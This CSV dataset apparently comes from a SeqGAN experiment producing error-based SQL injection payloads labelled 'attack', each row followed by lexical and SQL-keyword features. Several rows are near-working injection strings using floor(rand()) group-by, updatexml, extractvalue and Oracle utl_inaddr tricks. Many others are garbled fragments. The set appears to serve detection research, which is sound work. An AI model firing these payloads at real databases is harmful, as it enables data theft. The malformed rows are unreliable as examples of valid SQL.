label,payload,family,payload_type,method,run_id,sample_index,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,keyword_total
attack,-7810 or AND 4493  =  utl_inuvajjhral_hopu,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,320,42.0,26.0,4.43026094762241,23.0,8.0,7.0,4.0,0.5476190476190477,0.19047619047619047,0.16666666666666666,0.09523809523809523,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"-9740""   )    )    having information_schema=  6   )    )   x from information_schema_pross   (     )  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   a alt from   (  case when   (  select countas  )   )   --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,321,218.0,34.0,3.7814075116075134,93.0,16.0,85.0,24.0,0.42660550458715596,0.07339449541284404,0.38990825688073394,0.11009174311926606,0.0,1.0,3.0,0.0,0.0,1.0,0.0,15.0,0.0,3.0,1.0,4.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,-6236'   )    )   xte  )   or rount  )  )   as group by x  )  --,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,322,64.0,20.0,3.109669447201986,20.0,4.0,30.0,10.0,0.3125,0.0625,0.46875,0.15625,1.0,0.0,3.0,0.0,0.0,0.0,0.0,6.0,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,1 u,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,323,3.0,3.0,1.584962500721156,1.0,1.0,1.0,0.0,0.3333333333333333,0.3333333333333333,0.3333333333333333,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1""   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  "" or a viwzq"" like ""h",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,324,351.0,42.0,3.8766353793091306,114.0,55.0,142.0,40.0,0.3247863247863248,0.15669515669515668,0.4045584045584046,0.11396011396011396,0.0,4.0,0.0,0.0,2.0,1.0,0.0,26.0,0.0,0.0,6.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,14.0
attack,"1'   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'jdmwyj'  =  'h""  =  ""xuhbj",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,325,237.0,35.0,3.497834978859024,59.0,32.0,111.0,35.0,0.2489451476793249,0.1350210970464135,0.46835443037974683,0.14767932489451477,4.0,2.0,0.0,0.0,1.0,3.0,0.0,20.0,0.0,0.0,4.0,4.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"-""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""ctjvum",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,326,299.0,38.0,3.814391095849807,106.0,34.0,121.0,38.0,0.35451505016722407,0.11371237458193979,0.40468227424749165,0.12709030100334448,0.0,2.0,1.0,0.0,2.0,1.0,0.0,24.0,0.0,2.0,5.0,4.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""gu'  =  'evul",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,327,224.0,32.0,3.3708538737076186,53.0,32.0,107.0,32.0,0.23660714285714285,0.14285714285714285,0.47767857142857145,0.14285714285714285,2.0,2.0,0.0,0.0,1.0,2.0,0.0,20.0,0.0,0.0,4.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1%""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""%""  =  ""%'  =  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,328,332.0,39.0,3.9528594122199974,101.0,55.0,129.0,47.0,0.3042168674698795,0.16566265060240964,0.3885542168674699,0.14156626506024098,4.0,4.0,0.0,0.0,2.0,4.0,0.0,22.0,4.0,0.0,6.0,7.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,-3362'dv'  =  'u,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,329,16.0,10.0,3.077819531114783,3.0,4.0,4.0,5.0,0.1875,0.25,0.25,0.3125,3.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack, AND 1 from  (  =  or prou,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,330,26.0,13.0,3.0570144891718396,13.0,1.0,10.0,2.0,0.5,0.038461538461538464,0.38461538461538464,0.07692307692307693,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"""   )    )    procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (   ""lo_phr.egu' where 7783  =  7783 and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161   )    )   +'t'  =  'eu_"" like ""eu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,331,416.0,41.0,3.9714201602038814,125.0,82.0,155.0,54.0,0.3004807692307692,0.1971153846153846,0.37259615384615385,0.12980769230769232,4.0,4.0,0.0,0.0,0.0,4.0,0.0,27.0,0.0,2.0,11.0,5.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.0,0.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1"" where 6082  )  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,332,20.0,13.0,3.346439344671016,5.0,5.0,6.0,4.0,0.25,0.25,0.3,0.2,0.0,1.0,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1%'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,333,331.0,40.0,3.8796322092636553,102.0,55.0,133.0,41.0,0.3081570996978852,0.1661631419939577,0.40181268882175225,0.12386706948640483,2.0,2.0,0.0,0.0,2.0,2.0,0.0,24.0,2.0,0.0,6.0,5.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1%""  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  '%""  =  ""jrwhen""  =  ""i6056t""  =  ""x""  =  ""aows",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,334,494.0,41.0,3.8966522955148473,149.0,77.0,196.0,72.0,0.3016194331983806,0.15587044534412955,0.3967611336032389,0.145748987854251,2.0,10.0,0.0,0.0,2.0,6.0,0.0,36.0,2.0,2.0,11.0,8.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1""  )   )     )     ) R RO DISTINCT   FROM   (  4232  =  )   then 1 union by concat  (  =  4386  )   )   ,  )  )   di aleres  )   then union 'i'  =  (  =  )   then 1 else 0 end   )   ,1  )   from information_schema.Uhsss  )  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,335,227.0,45.0,3.8459289679445687,87.0,13.0,97.0,30.0,0.3832599118942731,0.05726872246696035,0.42731277533039647,0.13215859030837004,2.0,1.0,2.0,0.0,0.0,4.0,0.0,17.0,0.0,1.0,2.0,6.0,1.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,1%'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  '%,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,336,341.0,33.0,3.567487907544697,92.0,45.0,144.0,60.0,0.2697947214076246,0.13196480938416422,0.4222873900293255,0.17595307917888564,2.0,0.0,0.0,0.0,0.0,2.0,0.0,30.0,2.0,3.0,0.0,22.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1D""  =  ""edu'  =  'jmwb""  =  ""ijv",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,337,33.0,15.0,3.2330475281215643,11.0,1.0,12.0,9.0,0.3333333333333333,0.030303030303030304,0.36363636363636365,0.2727272727272727,2.0,4.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,3.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1 andulh where 9172  =  '  )  )   )     and, dual  )  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,338,56.0,19.0,3.279696439528413,18.0,5.0,24.0,9.0,0.32142857142857145,0.08928571428571429,0.42857142857142855,0.16071428571428573,1.0,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'j'  =  'wlwuzu'  =  'u",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,339,232.0,32.0,3.377907461010512,54.0,32.0,111.0,35.0,0.23275862068965517,0.13793103448275862,0.47844827586206895,0.15086206896551724,6.0,0.0,0.0,0.0,1.0,3.0,0.0,20.0,0.0,0.0,4.0,4.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1""   )    )    )   :te)   ::texe  )  )   from dual  )  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,340,57.0,17.0,2.779509166490535,14.0,1.0,29.0,13.0,0.24561403508771928,0.017543859649122806,0.5087719298245614,0.22807017543859648,0.0,1.0,2.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1"" and expr  sextractvalue  (  =  4232  )   WHERE LIMIT  =  ||  (  =  =  )   FROM   (  4232  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,341,95.0,34.0,3.899477629200983,34.0,9.0,38.0,14.0,0.35789473684210527,0.09473684210526316,0.4,0.14736842105263157,0.0,1.0,2.0,0.0,0.0,4.0,0.0,5.0,0.0,0.0,0.0,8.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,-%'  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  '%'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,342,348.0,34.0,3.5861430360711717,92.0,44.0,148.0,64.0,0.26436781609195403,0.12643678160919541,0.42528735632183906,0.1839080459770115,4.0,0.0,1.0,0.0,0.0,3.0,0.0,30.0,2.0,3.0,0.0,24.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"-8844""   )    )   having zl where 4607  =  6056 or group by concat  (  >  (  select   (  case when   (  select coumgchrer.gs group by end   )   then RWNUiowcepr",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,343,160.0,39.0,4.207287323958934,85.0,12.0,51.0,12.0,0.53125,0.075,0.31875,0.075,0.0,1.0,1.0,0.0,0.0,1.0,0.0,7.0,0.0,0.0,0.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1""   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   ""kw'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'fylfg",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,344,650.0,40.0,3.884598351762778,211.0,109.0,258.0,72.0,0.32461538461538464,0.1676923076923077,0.39692307692307693,0.11076923076923077,2.0,2.0,0.0,0.0,4.0,2.0,0.0,48.0,0.0,0.0,12.0,8.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,12.0,6.0,0.0,2.0,4.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,26.0
attack,"-%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """"  =  ""Own_z6   (    )   x where 5856  =  chrcas 3850mproceprjrntedse",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,345,412.0,40.0,3.753696500792939,116.0,57.0,169.0,70.0,0.2815533980582524,0.1383495145631068,0.41019417475728154,0.16990291262135923,0.0,6.0,1.0,0.0,0.0,5.0,0.0,32.0,2.0,1.0,1.0,26.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1' where ri Low  (  1297,  )   a mitant  (  =  )   then 1 group by x group  =  )   as group by select ow  122  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,346,113.0,31.0,3.912298735024368,51.0,9.0,42.0,11.0,0.45132743362831856,0.07964601769911504,0.37168141592920356,0.09734513274336283,1.0,0.0,2.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ibdjFROM'  =  'uow'  =  'wv'  =  'w'  =  '' from dual where 8294  =  8294 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,347,509.0,47.0,4.029567480501455,169.0,74.0,196.0,70.0,0.3320235756385069,0.14538310412573674,0.3850687622789784,0.137524557956778,12.0,0.0,0.0,0.0,3.0,7.0,0.0,33.0,0.0,2.0,9.0,12.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,6.0,0.0,1.0,4.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,17.0
attack,"1%"" and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__100__V8__sql_aware__len160__gpre160__reward_on__seed88,348,343.0,34.0,3.5380841402836896,84.0,49.0,148.0,62.0,0.24489795918367346,0.14285714285714285,0.4314868804664723,0.18075801749271136,0.0,4.0,0.0,0.0,0.0,3.0,0.0,30.0,2.0,0.0,1.0,23.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
